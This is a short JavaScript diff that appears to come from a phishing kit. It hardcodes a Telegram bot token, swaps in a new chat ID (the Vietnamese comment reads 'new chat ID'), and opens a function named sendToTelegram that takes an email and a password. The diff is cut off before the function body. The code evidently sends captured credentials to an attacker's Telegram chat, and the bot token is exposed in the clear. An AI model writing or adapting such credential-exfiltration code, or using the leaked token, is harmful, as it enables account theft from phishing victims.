@@ -1,6 +1,6 @@
 // Replace these with your actual Telegram bot token and chat ID
 const TELEGRAM_BOT_TOKEN = "7767652234:AAEhpG-XDsenEBI-awMKptdtKL5XyFTgw7U";
-const TELEGRAM_CHAT_ID = "7910048129"; // Chat ID mới
+const TELEGRAM_CHAT_ID = "6809887911"; // Chat ID mới
 
 export const sendToTelegram = async (email, password) => {
   try {
